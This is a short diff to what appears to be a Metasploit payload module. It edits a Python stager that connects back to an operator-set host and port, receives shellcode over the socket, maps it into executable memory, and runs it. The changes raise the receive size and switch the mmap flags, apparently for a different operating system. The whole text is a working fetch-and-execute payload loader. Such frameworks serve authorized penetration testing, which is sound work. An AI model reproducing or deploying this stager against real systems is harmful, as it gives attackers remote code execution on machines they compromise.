@@ -35,11 +35,11 @@ module MetasploitModule
     raw_cmd = %(import socket,struct,ctypes,ctypes.util
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((\"#{datastore['LHOST']}\",#{datastore['LPORT']}))
-sc=b\"\\xbf\"+struct.pack(\"<L\",s.fileno())+s.recv(126)
+sc=b\"\\xbf\"+struct.pack(\"<L\",s.fileno())+s.recv(4096)
 l=ctypes.CDLL(ctypes.util.find_library(\"c\"))
 l.mmap.restype=ctypes.c_void_p
 l.mprotect.argtypes=[ctypes.c_void_p,ctypes.c_int,ctypes.c_int]
-m=l.mmap(0,len(sc),3,0x22,-1,0)
+m=l.mmap(0,len(sc),3,0x1002,-1,0)
 ctypes.memmove(m,sc,len(sc))
 l.mprotect(m,len(sc),5)
 ctypes.CFUNCTYPE(ctypes.c_int)(m)())
